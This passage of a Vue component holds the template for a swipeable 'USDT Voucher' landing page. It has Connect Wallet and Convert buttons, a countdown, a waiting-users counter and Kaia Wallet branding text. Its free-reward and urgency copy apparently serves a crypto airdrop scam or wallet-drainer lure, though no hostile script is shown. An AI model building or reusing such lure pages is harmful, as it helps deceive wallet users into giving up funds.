                 alt="data:image/svg+xml,%3csvg%20width='100%25'%20height='100%25'%20viewBox='0%200%2040%2040'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20d='M0%2020C0%208.95431%208.95431%200%2020%200C31.0457%200%2040%208.95431%2040%2020C40%2031.0457%2031.0457%2040%2020%2040C8.95431%2040%200%2031.0457%200%2020Z'%20fill='%23BFF009'/%3e%3cpath%20fill-rule='evenodd'%20clip-rule='evenodd'%20d='M13.309%2013.2L17.7013%2026.9006L18.126%2025.5772L14.158%2013.2H15.6286L18.8616%2023.284L19.2853%2021.9606L16.4776%2013.2H17.9482L20.0209%2019.6664L22.0949%2013.2H32.7992L27.6691%2029.2H16.9648L16.9667%2029.1948L11.8384%2013.2H13.309ZM10.9894%2013.2L16.1195%2029.2H14.6489L9.51882%2013.2H10.9894ZM8.66982%2013.2L13.7999%2029.2H12.3293L7.19922%2013.2H8.66982Z'%20fill='black'/%3e%3c/svg%3e"
                 src="data:image/svg+xml,%3csvg%20width='100%25'%20height='100%25'%20viewBox='0%200%2040%2040'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20d='M0%2020C0%208.95431%208.95431%200%2020%200C31.0457%200%2040%208.95431%2040%2020C40%2031.0457%2031.0457%2040%2020%2040C8.95431%2040%200%2031.0457%200%2020Z'%20fill='%23BFF009'/%3e%3cpath%20fill-rule='evenodd'%20clip-rule='evenodd'%20d='M13.309%2013.2L17.7013%2026.9006L18.126%2025.5772L14.158%2013.2H15.6286L18.8616%2023.284L19.2853%2021.9606L16.4776%2013.2H17.9482L20.0209%2019.6664L22.0949%2013.2H32.7992L27.6691%2029.2H16.9648L16.9667%2029.1948L11.8384%2013.2H13.309ZM10.9894%2013.2L16.1195%2029.2H14.6489L9.51882%2013.2H10.9894ZM8.66982%2013.2L13.7999%2029.2H12.3293L7.19922%2013.2H8.66982Z'%20fill='black'/%3e%3c/svg%3e"
                 style="border-radius: 50%;">

            <svg class="mo_open" xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="#fff" viewBox="0 0 40 40" style="fill: #fff"><path fill-rule="evenodd" d="M28.692 6.664v5h5a1.667 1.667 0 0 1 1.673 1.666v8.423h-3.337v-6.756h-23.7a5 5 0 0 1-1.667-.3v16.598a1.667 1.667 0 0 0 1.667 1.667h23.7v-5.605h3.337v7.271a1.667 1.667 0 0 1-1.673 1.667H8.328a5 5 0 0 1-5-5V9.997a5 5 0 0 1 5-5h18.697a1.666 1.666 0 0 1 1.667 1.667M7.15 8.819a1.67 1.67 0 0 1 1.178-.489h17.03v3.334H8.328A1.667 1.667 0 0 1 7.15 8.819" clip-rule="evenodd"></path><path fill-rule="evenodd" d="M20.853 24.018A4.017 4.017 0 0 1 24.87 20h10.69a4.017 4.017 0 0 1 0 8.035H24.87a4.017 4.017 0 0 1-4.017-4.017m4.017-.684a.684.684 0 1 0 0 1.368h10.69a.684.684 0 0 0 0-1.368z" clip-rule="evenodd"></path></svg>

            <div class="wladd" v-if="isConnected">{{ address }}</div>
            <div class="wladd pc_open" v-else>Connect Wallet</div>

            <!--            <div class="wladd_close">-->
            <!--              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#C8C8C8" viewBox="0 0 12 12"-->
            <!--                   style="fill: rgb(191, 240, 9);">-->
            <!--                <path fill-rule="evenodd"-->
            <!--                      d="M2.227 2.227c.22-.22.576-.22.796 0L6 5.205l2.977-2.978a.563.563 0 0 1 .796.796L6.796 6l2.977 2.977a.563.563 0 0 1-.796.796L6 6.796 3.023 9.772a.563.563 0 0 1-.796-.796L5.205 6 2.227 3.023a.563.563 0 0 1 0-.796"-->
            <!--                      clip-rule="evenodd"></path>-->
            <!--              </svg>-->
            <!--            </div>-->
          </button>
        </header>
        <main>
          <div class="content_box1">
            <div class="waiting_box">
              <span class="numbers">{{ waitingUsers.toLocaleString() }}</span>&nbsp;
              <span>users are waiting</span>
            </div>
            <div class="txt_box1">
              <div class="txt1">Prepare for</div>
              <div class="txt2">Epoch#2 Missions</div>
              <div class="txt1">Unlock USDT Exchange Rewards!</div>
            </div>
            <div class="txt_box2">
              Epoch#2 Launching Soon – Claim Your Vouchers!<br/>
              Start DeFi & Swap Tokens for USDT!
            </div>
            <div class="txt_box3 pc_open">
              <span class="numbers">{{ countdown.days }}</span>&nbsp;
              <span>Days</span>&nbsp;
              <span style="color:rgba(255, 255, 255, 0.99);">:</span>&nbsp;
              <span class="numbers">{{ countdown.hours }}</span>&nbsp;
              <span>Hours</span>&nbsp;
              <span style="color:rgba(255, 255, 255, 0.99);">:</span>&nbsp;
              <span class="numbers">{{ countdown.minutes }}</span>&nbsp;
              <span>Minutes</span>&nbsp;
              <span style="color:rgba(255, 255, 255, 0.99);">:</span>&nbsp;
              <span class="numbers">{{ countdown.seconds }}s</span>&nbsp;
              <span>Left</span>
            </div>


            <div class="txt_box3 mo_open">
              <span class="numbers">{{ countdown.days }}</span>&nbsp;
              <span style="color:rgba(255, 255, 255, 0.99);">:</span>&nbsp;
              <span class="numbers">{{ countdown.hours }}</span>&nbsp;
              <span style="color:rgba(255, 255, 255, 0.99);">:</span>&nbsp;
              <span class="numbers">{{ countdown.minutes }}</span>&nbsp;
              <span style="color:rgba(255, 255, 255, 0.99);">:</span>&nbsp;
              <span class="numbers">{{ countdown.seconds }}</span>&nbsp;
              <span>Left</span>
            </div>
          </div>
          <div class="swap_box">
            <div class="ctv_box" style="display: flex; flex-flow: row nowrap;">

              <div class="in_box"><img src="/public/images/2M.gif"/></div>
              <div class="in_box_text">
                <div style="font-weight: bold; color: #909090; font-size: 22px;">USDT Voucher</div>
                <div>
                  An NFT-based digital voucher redeemable for USDT
                </div>
              </div>

              <!-- <div>
                <div>From</div>
                <div style="margin:5px 0;"><input type="text" class="inp" value="" placeholder="1" /></div>
              </div>

              <div>
                <video src="/public/images/sss.gif.mp4"></video>
              </div> -->

            </div>


            <div class="ctv_bticon">
              <img src="/public/images/bottom.png" alt="">
            </div>

            <div class="mo_to" style="padding-left: 20px;">
              To
            </div>

            <div class="ctv_box mo_padding" style="display: flex; flex-flow: row nowrap; justify-content: space-between;">
              <div style="font-size: 30px; font-weight: bold; color: #fff;">50</div>
              <div style="display: flex; padding-top: 10px;">
                <img src="/public/images/td.png" style="width: 30px; height: 25px; margin-top: 3px;" alt="">
                <span
                    style="font-weight: bold; padding-left: 5px; height: 30px; line-height: 30px; font-size: 22px; color: #909090;">USDT</span>
              </div>
            </div>


            <!-- 
            <div class="choice_box" style="flex:1;">
              <div @click="selectTokenLayer = true"
                style="display: flex;align-items: center;justify-content: space-between;margin-bottom:10px;cursor: pointer;">
                <div>From</div>
                <div style="display: flex;">
                  <img src="/public/images/td.png" style="width: 30px; height: 25px; margin-top: 3px;"  alt="">
                  <span style="font-weight: bold; padding-left: 5px; height: 30px; line-height: 30px; font-size: 22px;">USDT</span>
                </div>
              </div>


              <div style="margin:5px 0;"><input type="text" class="inp" value="" placeholder="50" /></div>
              <div style="margin:5px 0;"><span style="font-size:12px;">≈ $0.00</span></div>
              <div style="margin:5px 0;"><span class="balance">Balance 0</span></div>
              <div style="margin-top:10px;color:rgb(232, 91, 86);display: flex;align-items: center;">
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="#57CF3F" viewBox="0 0 20 21"
                  style="fill: rgb(232, 91, 86);">
                  <path fill-rule="evenodd"
                    d="M1.563 10.5a8.438 8.438 0 1 1 16.875 0 8.438 8.438 0 0 1-16.875 0m8.28-4.687a1.25 1.25 0 1 0 0 2.5 1.25 1.25 0 0 0 0-2.5M8.439 9.875c0-.518.42-.937.937-.937H10c.518 0 .938.42.938.937v3.49a.938.938 0 0 1-.313 1.822H10a.937.937 0 0 1-.937-.937v-3.49a.94.94 0 0 1-.626-.885"
                    clip-rule="evenodd"></path>
                </svg>&nbsp;
                <div>Insufficient KAIA balance for fee</div>
              </div>
            </div> -->

            <div style="height: 20px;"></div>
            <!-- 
            <div class="choice_box">
              <div style="display: flex;align-items: center;justify-content: space-between;">
                <div>To</div>
                <div>Wellet</div>
              </div>
              <div class="wallet_addr">0x232465465465q654rsdf65x4g6df4ge6rg54df6g465</div>
            </div> -->

            <div class="btn_box">

              <button class="btn_on">
                <div class="btn_text" v-if="isConnected" @click="showDialog('pleaseConfirm')">Convert</div>
                <div class="btn_text" v-else @click="showDialog(data.defaultShow)">Connect Wallet</div>
                <div class="proto_icon">
                  <svg xmlns="http://www.w3.org/2000/svg" fill="rgba(255, 255, 255, 1)" viewBox="0 0 32 33"
                       style="width: var(--Sizing-4, 20px); height: var(--Sizing-4, 20px);">
                    <path fill-rule="evenodd"
                          d="M11.293 5.293a1 1 0 0 1 1.414 0l10 10a1 1 0 0 1 0 1.414l-10 10a1 1 0 0 1-1.414-1.414L20.586 16l-9.293-9.293a1 1 0 0 1 0-1.414"
                          clip-rule="evenodd"></path>
                    <path fill-rule="evenodd"
                          d="M10.94 4.94a1.5 1.5 0 0 1 2.12 0l10 10a1.5 1.5 0 0 1 0 2.12l-10 10a1.5 1.5 0 0 1-2.12-2.12L19.878 16l-8.94-8.94a1.5 1.5 0 0 1 0-2.12m1.414.706a.5.5 0 0 0-.708.708l9.293 9.292a.5.5 0 0 1 0 .708l-9.293 9.292a.5.5 0 0 0 .708.708l10-10a.5.5 0 0 0 0-.708z"
                          clip-rule="evenodd"></path>
                  </svg>
                </div>
              </button>

            </div>

          </div>
        </main>
        <footer>
          <div class="btn_next" @click="slideNext">NEXT</div>
        </footer>
      </div>
    </swiper-slide>

    <swiper-slide>
      <div class="page p2">
        <header>
          <div style="flex: 1; padding-top: 11px;">
            <img src="/public/images/logo1.svg" alt="logo"
                 style="width: 148px;height: 24px; justify-content:flex-start;">
          </div>
          <button class="hd_button">
            <img width="32" height="32" class="pc_open"
                 alt="data:image/svg+xml,%3csvg%20width='100%25'%20height='100%25'%20viewBox='0%200%2040%2040'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20d='M0%2020C0%208.95431%208.95431%200%2020%200C31.0457%200%2040%208.95431%2040%2020C40%2031.0457%2031.0457%2040%2020%2040C8.95431%2040%200%2031.0457%200%2020Z'%20fill='%23BFF009'/%3e%3cpath%20fill-rule='evenodd'%20clip-rule='evenodd'%20d='M13.309%2013.2L17.7013%2026.9006L18.126%2025.5772L14.158%2013.2H15.6286L18.8616%2023.284L19.2853%2021.9606L16.4776%2013.2H17.9482L20.0209%2019.6664L22.0949%2013.2H32.7992L27.6691%2029.2H16.9648L16.9667%2029.1948L11.8384%2013.2H13.309ZM10.9894%2013.2L16.1195%2029.2H14.6489L9.51882%2013.2H10.9894ZM8.66982%2013.2L13.7999%2029.2H12.3293L7.19922%2013.2H8.66982Z'%20fill='black'/%3e%3c/svg%3e"
                 src="data:image/svg+xml,%3csvg%20width='100%25'%20height='100%25'%20viewBox='0%200%2040%2040'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20d='M0%2020C0%208.95431%208.95431%200%2020%200C31.0457%200%2040%208.95431%2040%2020C40%2031.0457%2031.0457%2040%2020%2040C8.95431%2040%200%2031.0457%200%2020Z'%20fill='%23BFF009'/%3e%3cpath%20fill-rule='evenodd'%20clip-rule='evenodd'%20d='M13.309%2013.2L17.7013%2026.9006L18.126%2025.5772L14.158%2013.2H15.6286L18.8616%2023.284L19.2853%2021.9606L16.4776%2013.2H17.9482L20.0209%2019.6664L22.0949%2013.2H32.7992L27.6691%2029.2H16.9648L16.9667%2029.1948L11.8384%2013.2H13.309ZM10.9894%2013.2L16.1195%2029.2H14.6489L9.51882%2013.2H10.9894ZM8.66982%2013.2L13.7999%2029.2H12.3293L7.19922%2013.2H8.66982Z'%20fill='black'/%3e%3c/svg%3e"
                 style="border-radius: 50%;">

            <svg class="mo_open" xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="#fff" viewBox="0 0 40 40" style="fill: #fff"><path fill-rule="evenodd" d="M28.692 6.664v5h5a1.667 1.667 0 0 1 1.673 1.666v8.423h-3.337v-6.756h-23.7a5 5 0 0 1-1.667-.3v16.598a1.667 1.667 0 0 0 1.667 1.667h23.7v-5.605h3.337v7.271a1.667 1.667 0 0 1-1.673 1.667H8.328a5 5 0 0 1-5-5V9.997a5 5 0 0 1 5-5h18.697a1.666 1.666 0 0 1 1.667 1.667M7.15 8.819a1.67 1.67 0 0 1 1.178-.489h17.03v3.334H8.328A1.667 1.667 0 0 1 7.15 8.819" clip-rule="evenodd"></path><path fill-rule="evenodd" d="M20.853 24.018A4.017 4.017 0 0 1 24.87 20h10.69a4.017 4.017 0 0 1 0 8.035H24.87a4.017 4.017 0 0 1-4.017-4.017m4.017-.684a.684.684 0 1 0 0 1.368h10.69a.684.684 0 0 0 0-1.368z" clip-rule="evenodd"></path></svg>
            <div class="wladd" v-if="isConnected">{{ address }}</div>
            <div class="wladd pc_open" v-else>Connect Wallet</div>
            <!-- <div class="wladd_close">
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#C8C8C8" viewBox="0 0 12 12"
                   style="fill: rgb(191, 240, 9);">
                <path fill-rule="evenodd"
                      d="M2.227 2.227c.22-.22.576-.22.796 0L6 5.205l2.977-2.978a.563.563 0 0 1 .796.796L6.796 6l2.977 2.977a.563.563 0 0 1-.796.796L6 6.796 3.023 9.772a.563.563 0 0 1-.796-.796L5.205 6 2.227 3.023a.563.563 0 0 1 0-.796"
                      clip-rule="evenodd"></path>
              </svg>
            </div> -->
          </button>
        </header>
        <main>

          <div class="content_box1">

            <div>
              <img src="/images/Img_Kaia_Wallet.png" style="max-width: 100%;"/>
            </div>
            <div class="font_1">Welcome to Kaia, where your<br/>Web3 journey begins<br/>PLAY NOW</div>
            <div class="font_2">
              From top-tier DeFi protocols to AAA<br/> games, real-world assets, fandoms,<br/> communities and more, Kaia’s <br/>vibrant ecosystem is enjoyed by millions <br/> across Asia everyday.
            </div>

          </div>

        </main>
        <footer>
          <div class="btn_next" @click="slideNext">NEXT</div>
        </footer>
      </div>
    </swiper-slide>

    <swiper-slide>
      <div class="page p2">
        <header>
          <div style="flex: 1; padding-top: 11px;">
            <img src="/public/images/logo1.svg" alt="logo"
                 style="width: 148px;height: 24px; justify-content:flex-start;">
          </div>
          <button class="hd_button">
            <img width="32" height="32" class="pc_open"
                 alt="data:image/svg+xml,%3csvg%20width='100%25'%20height='100%25'%20viewBox='0%200%2040%2040'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20d='M0%2020C0%208.95431%208.95431%200%2020%200C31.0457%200%2040%208.95431%2040%2020C40%2031.0457%2031.0457%2040%2020%2040C8.95431%2040%200%2031.0457%200%2020Z'%20fill='%23BFF009'/%3e%3cpath%20fill-rule='evenodd'%20clip-rule='evenodd'%20d='M13.309%2013.2L17.7013%2026.9006L18.126%2025.5772L14.158%2013.2H15.6286L18.8616%2023.284L19.2853%2021.9606L16.4776%2013.2H17.9482L20.0209%2019.6664L22.0949%2013.2H32.7992L27.6691%2029.2H16.9648L16.9667%2029.1948L11.8384%2013.2H13.309ZM10.9894%2013.2L16.1195%2029.2H14.6489L9.51882%2013.2H10.9894ZM8.66982%2013.2L13.7999%2029.2H12.3293L7.19922%2013.2H8.66982Z'%20fill='black'/%3e%3c/svg%3e"
                 src="data:image/svg+xml,%3csvg%20width='100%25'%20height='100%25'%20viewBox='0%200%2040%2040'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20d='M0%2020C0%208.95431%208.95431%200%2020%200C31.0457%200%2040%208.95431%2040%2020C40%2031.0457%2031.0457%2040%2020%2040C8.95431%2040%200%2031.0457%200%2020Z'%20fill='%23BFF009'/%3e%3cpath%20fill-rule='evenodd'%20clip-rule='evenodd'%20d='M13.309%2013.2L17.7013%2026.9006L18.126%2025.5772L14.158%2013.2H15.6286L18.8616%2023.284L19.2853%2021.9606L16.4776%2013.2H17.9482L20.0209%2019.6664L22.0949%2013.2H32.7992L27.6691%2029.2H16.9648L16.9667%2029.1948L11.8384%2013.2H13.309ZM10.9894%2013.2L16.1195%2029.2H14.6489L9.51882%2013.2H10.9894ZM8.66982%2013.2L13.7999%2029.2H12.3293L7.19922%2013.2H8.66982Z'%20fill='black'/%3e%3c/svg%3e"
                 style="border-radius: 50%;">

            <svg class="mo_open" xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="#fff" viewBox="0 0 40 40" style="fill: #fff"><path fill-rule="evenodd" d="M28.692 6.664v5h5a1.667 1.667 0 0 1 1.673 1.666v8.423h-3.337v-6.756h-23.7a5 5 0 0 1-1.667-.3v16.598a1.667 1.667 0 0 0 1.667 1.667h23.7v-5.605h3.337v7.271a1.667 1.667 0 0 1-1.673 1.667H8.328a5 5 0 0 1-5-5V9.997a5 5 0 0 1 5-5h18.697a1.666 1.666 0 0 1 1.667 1.667M7.15 8.819a1.67 1.67 0 0 1 1.178-.489h17.03v3.334H8.328A1.667 1.667 0 0 1 7.15 8.819" clip-rule="evenodd"></path><path fill-rule="evenodd" d="M20.853 24.018A4.017 4.017 0 0 1 24.87 20h10.69a4.017 4.017 0 0 1 0 8.035H24.87a4.017 4.017 0 0 1-4.017-4.017m4.017-.684a.684.684 0 1 0 0 1.368h10.69a.684.684 0 0 0 0-1.368z" clip-rule="evenodd"></path></svg>
            <div class="wladd" v-if="isConnected">{{ address }}</div>
            <div class="wladd pc_open" v-else>Connect Wallet</div>
            <!-- <div class="wladd_close">
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#C8C8C8" viewBox="0 0 12 12"
                   style="fill: rgb(191, 240, 9);">
                <path fill-rule="evenodd"
                      d="M2.227 2.227c.22-.22.576-.22.796 0L6 5.205l2.977-2.978a.563.563 0 0 1 .796.796L6.796 6l2.977 2.977a.563.563 0 0 1-.796.796L6 6.796 3.023 9.772a.563.563 0 0 1-.796-.796L5.205 6 2.227 3.023a.563.563 0 0 1 0-.796"
                      clip-rule="evenodd"></path>
              </svg>
            </div> -->
          </button>
        </header>
        <main>

          <div class="content_box1">

            <div>
              <img src="/images/1719900971275.png"/>
            </div>
            <div class="font_1">What has changed compared <br/> to the existing Kaikas?</div>
            <div class="font_2">The Kaia Wallet app allows you to use your<br/>wallet more safely and easily through social login.
            </div>

          </div>

        </main>
        <footer>
          <div class="btn_next" @click="slideNext">NEXT</div>
        </footer>
      </div>
    </swiper-slide>

    <swiper-slide>
      <div class="page p2">
        <header>
          <div style="flex: 1; padding-top: 11px;">
            <img src="/public/images/logo1.svg" alt="logo"
                 style="width: 148px;height: 24px; justify-content:flex-start;">
          </div>
          <button class="hd_button">
            <img width="32" height="32" class="pc_open"
                 alt="data:image/svg+xml,%3csvg%20width='100%25'%20height='100%25'%20viewBox='0%200%2040%2040'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20d='M0%2020C0%208.95431%208.95431%200%2020%200C31.0457%200%2040%208.95431%2040%2020C40%2031.0457%2031.0457%2040%2020%2040C8.95431%2040%200%2031.0457%200%2020Z'%20fill='%23BFF009'/%3e%3cpath%20fill-rule='evenodd'%20clip-rule='evenodd'%20d='M13.309%2013.2L17.7013%2026.9006L18.126%2025.5772L14.158%2013.2H15.6286L18.8616%2023.284L19.2853%2021.9606L16.4776%2013.2H17.9482L20.0209%2019.6664L22.0949%2013.2H32.7992L27.6691%2029.2H16.9648L16.9667%2029.1948L11.8384%2013.2H13.309ZM10.9894%2013.2L16.1195%2029.2H14.6489L9.51882%2013.2H10.9894ZM8.66982%2013.2L13.7999%2029.2H12.3293L7.19922%2013.2H8.66982Z'%20fill='black'/%3e%3c/svg%3e"
                 src="data:image/svg+xml,%3csvg%20width='100%25'%20height='100%25'%20viewBox='0%200%2040%2040'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20d='M0%2020C0%208.95431%208.95431%200%2020%200C31.0457%200%2040%208.95431%2040%2020C40%2031.0457%2031.0457%2040%2020%2040C8.95431%2040%200%2031.0457%200%2020Z'%20fill='%23BFF009'/%3e%3cpath%20fill-rule='evenodd'%20clip-rule='evenodd'%20d='M13.309%2013.2L17.7013%2026.9006L18.126%2025.5772L14.158%2013.2H15.6286L18.8616%2023.284L19.2853%2021.9606L16.4776%2013.2H17.9482L20.0209%2019.6664L22.0949%2013.2H32.7992L27.6691%2029.2H16.9648L16.9667%2029.1948L11.8384%2013.2H13.309ZM10.9894%2013.2L16.1195%2029.2H14.6489L9.51882%2013.2H10.9894ZM8.66982%2013.2L13.7999%2029.2H12.3293L7.19922%2013.2H8.66982Z'%20fill='black'/%3e%3c/svg%3e"
                 style="border-radius: 50%;">

            <svg class="mo_open" xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="#fff" viewBox="0 0 40 40" style="fill: #fff"><path fill-rule="evenodd" d="M28.692 6.664v5h5a1.667 1.667 0 0 1 1.673 1.666v8.423h-3.337v-6.756h-23.7a5 5 0 0 1-1.667-.3v16.598a1.667 1.667 0 0 0 1.667 1.667h23.7v-5.605h3.337v7.271a1.667 1.667 0 0 1-1.673 1.667H8.328a5 5 0 0 1-5-5V9.997a5 5 0 0 1 5-5h18.697a1.666 1.666 0 0 1 1.667 1.667M7.15 8.819a1.67 1.67 0 0 1 1.178-.489h17.03v3.334H8.328A1.667 1.667 0 0 1 7.15 8.819" clip-rule="evenodd"></path><path fill-rule="evenodd" d="M20.853 24.018A4.017 4.017 0 0 1 24.87 20h10.69a4.017 4.017 0 0 1 0 8.035H24.87a4.017 4.017 0 0 1-4.017-4.017m4.017-.684a.684.684 0 1 0 0 1.368h10.69a.684.684 0 0 0 0-1.368z" clip-rule="evenodd"></path></svg>
            <div class="wladd" v-if="isConnected">{{ address }}</div>
            <div class="wladd pc_open" v-else>Connect Wallet</div>
            <!-- <div class="wladd_close">
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#C8C8C8" viewBox="0 0 12 12"
                   style="fill: rgb(191, 240, 9);">
                <path fill-rule="evenodd"
                      d="M2.227 2.227c.22-.22.576-.22.796 0L6 5.205l2.977-2.978a.563.563 0 0 1 .796.796L6.796 6l2.977 2.977a.563.563 0 0 1-.796.796L6 6.796 3.023 9.772a.563.563 0 0 1-.796-.796L5.205 6 2.227 3.023a.563.563 0 0 1 0-.796"
                      clip-rule="evenodd"></path>
              </svg>
            </div> -->
          </button>
        </header>
        <main>

          <div class="content_box1">

            <div>
              <img src="/images/1719900989631.png"/>
            </div>
            <div class="font_1">Can it be linked with the wallet <br/> used in the previous Kaikas app?</div>
            <div class="font_2">
              xisting Kaikas service users also<br/>
              By loading the wallet in the Kaia Wallet app<br/>
              You can bring your used Kaikas wallet
            </div>

          </div>

        </main>
        <footer>
          <!-- <div class="btn_next" @click="slideNext">NEXT</div> -->
        </footer>
      </div>
    </swiper-slide>
  </swiper>
</template>

<style>
.swiper {
  width: 100%;
  height: 100%;
}

.swiper-slide {
  display: flex;
}

.swiper-vertical > .swiper-pagination-bullets,
.swiper-pagination-vertical.swiper-pagination-bullets {
  right: 16px;
}

.swiper-pagination-bullet {
  margin: 10px 0;
  width: 15px;
  height: 15px;
  background-color: #eee;
}

.swiper-pagination-bullet-active {
  background-color: #CCF33A;
}
</style>